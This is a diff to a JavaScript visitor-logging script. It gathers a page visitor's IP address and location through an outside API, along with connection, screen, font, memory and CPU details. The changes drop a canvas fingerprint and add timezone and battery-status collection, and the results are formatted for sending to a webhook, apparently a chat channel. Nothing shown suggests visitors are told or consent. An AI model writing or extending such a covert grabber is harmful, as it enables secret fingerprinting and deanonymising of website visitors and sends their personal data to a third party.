@@ -249,8 +249,8 @@
         function getBrowserFonts() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
-            let detectedFonts = [];
+            const fonts = ['Arial', 'Verdana', 'Courier New', 'Georgia', 'Times New Roman'];
+            const detectedFonts = [];
             fonts.forEach(font => {
                 ctx.font = `12px ${font}`;
                 const text = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -258,15 +258,6 @@
                 detectedFonts.push({ font, width });
             });
             return detectedFonts;
-        }
-
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
-            return canvas.toDataURL();
         }
 
         function getIP() {
@@ -280,6 +271,24 @@
             return fetch('https://ipapi.co/json').then(res => res.json());
         }
 
+        function getTimezone() {
+            return Intl.DateTimeFormat().resolvedOptions().timeZone;
+        }
+
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: (battery.level * 100) + '%',
+                    charging: battery.charging ? 'Yes' : 'No'
+                };
+            }
+            return {
+                level: 'Not Available',
+                charging: 'Not Available'
+            };
+        }
+
         async function logVisitor() {
             if (!webhookURL) {
                 console.error('Webhook URL not set.');
@@ -289,12 +298,13 @@
             try {
                 const [ipIdent, ipLafibre] = await getIP();
                 const location = await getLocation();
-                const canvasFingerprint = getCanvasFingerprint();
                 const connection = getConnectionInfo();
                 const screen = getScreenInfo();
                 const fonts = getBrowserFonts();
                 const memory = getDeviceMemory();
                 const concurrency = getHardwareConcurrency();
+                const timezone = getTimezone();
+                const batteryStatus = await getBatteryStatus();
 
                 const payloads = [];
                 const payload = {
@@ -314,7 +324,9 @@
                      `⏳ **Connection RTT:** ${connection.rtt} ms\n` +
                      `🖥️ **Screen Resolution:** ${screen.width}x${screen.height}\n` +
                      `📏 **Available Screen Resolution:** ${screen.availWidth}x${screen.availHeight}\n` +
-                     `🖋️ **Canvas Fingerprint:** ${canvasFingerprint}\n` +
+                     `🕒 **Timezone:** ${timezone}\n` +
+                     `🔋 **Battery Level:** ${batteryStatus.level}\n` +
+                     `🔋 **Charging:** ${batteryStatus.charging}\n` +
                      `🖋️ **Fonts Detected:** ${fonts.map(f => f.font).join(', ')}\n`
                 };
 
